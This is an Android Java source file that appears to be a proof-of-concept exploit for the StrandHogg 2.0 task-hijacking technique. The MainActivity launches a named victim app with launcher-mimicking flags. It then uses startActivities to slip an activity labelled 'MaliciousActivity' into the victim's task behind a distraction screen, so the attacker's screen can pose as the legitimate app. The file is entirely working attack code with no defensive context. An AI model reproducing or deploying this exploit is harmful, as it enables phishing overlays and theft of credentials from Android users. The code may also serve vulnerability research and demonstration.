package com.strandhogg.v2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import static android.content.Intent.CATEGORY_LAUNCHER;
import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED;
import static android.content.Intent.FLAG_RECEIVER_FOREGROUND;
import static android.content.Intent.FLAG_RECEIVER_VISIBLE_TO_INSTANT_APPS;

public class MainActivity extends AppCompatActivity {

    String victimPackageName = "com.ActivityCounter";
    String victimActivity = "com.ActivityCounter.MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Mimic The Launcher Intent

        Intent minimizedIntent = new Intent(Intent.ACTION_MAIN);
        minimizedIntent.setComponent(new ComponentName(victimPackageName, victimActivity));
        minimizedIntent.setPackage(victimPackageName);

        minimizedIntent.addCategory(CATEGORY_LAUNCHER);  //Set the category to mimic launcher
        minimizedIntent.setFlags(FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
                | FLAG_RECEIVER_FOREGROUND | FLAG_RECEIVER_VISIBLE_TO_INSTANT_APPS); // Launcher Flags

        // Start Activity for result
        startActivityForResult(minimizedIntent, 0);
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // After victim app was started we instantly minimize by launching our own activity

        // Has no flags -> Will take the taskAffinity of the next task
        Intent attackIntent = new Intent(Intent.ACTION_MAIN);
        attackIntent.setComponent(new ComponentName(this.getPackageName(), "com.strandhogg.v2.MaliciousActivity"));

        // Launch Parent Task within new Task
        Intent baseIntent = new Intent(Intent.ACTION_MAIN);
        baseIntent.setComponent(new ComponentName(victimPackageName, victimActivity));
        baseIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        // Launch our benign distraction activity
        Intent distractionIntent = new Intent(this, DistractionActivity.class);
        distractionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        // Put it into an array and launch
        Intent[] intents = new Intent[]{baseIntent, attackIntent, distractionIntent};
        startActivities(intents);
    }
}
